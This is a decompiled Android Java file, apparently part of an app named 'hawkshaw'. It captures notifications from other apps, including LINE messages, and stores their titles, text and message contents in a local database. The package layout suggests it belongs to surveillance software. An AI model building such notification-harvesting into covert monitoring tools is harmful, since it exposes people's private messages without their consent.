package com.hawkshaw.library.features.accessibility;

import Y1.K;
import android.app.Notification;
import android.os.Bundle;
import androidx.core.app.NotificationCompat;
import com.hawkshaw.library.datalayer.models.PackageName;
import com.hawkshaw.library.datalayer.room.AppDatabaseKt;
import com.hawkshaw.library.datalayer.room.notification.NotificationEntity;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import z.f;

public final class NotificationKt {
    private static final ExecutorService executor = Executors.newSingleThreadExecutor();
    private static long lastTimestamp;

    private static final void handleNotification(Notification notification, CharSequence charSequence) {
        PackageName from = PackageName.Companion.from(charSequence);
        CharSequence charSequence2 = notification.tickerText;
        long j5 = notification.when;
        Bundle bundle = notification.extras;
        if (j5 != lastTimestamp) {
            if (from != PackageName.LINE || j5 >= lastTimestamp + ((long) 200)) {
                lastTimestamp = j5;
                AppDatabaseKt.getDb().notificationDao().insertSync(new NotificationEntity(charSequence.toString(), bundle.getString(NotificationCompat.EXTRA_TEXT), bundle.getString(NotificationCompat.EXTRA_TITLE), bundle.getString(NotificationCompat.EXTRA_MESSAGES), bundle.getString(NotificationCompat.EXTRA_BIG_TEXT), bundle.getStringArray(NotificationCompat.EXTRA_TEXT_LINES), charSequence2 != null ? charSequence2.toString() : null, j5));
            }
        }
    }

    public static final void handleNotificationAsync(Notification notification, CharSequence charSequence) {
        K.n(notification, "notification");
        K.n(charSequence, "packageName");
        executor.execute(new f(18, notification, charSequence));
    }

    /* access modifiers changed from: private */
    public static final void handleNotificationAsync$lambda$0(Notification notification, CharSequence charSequence) {
        K.n(notification, "$notification");
        K.n(charSequence, "$packageName");
        handleNotification(notification, charSequence);
    }
}
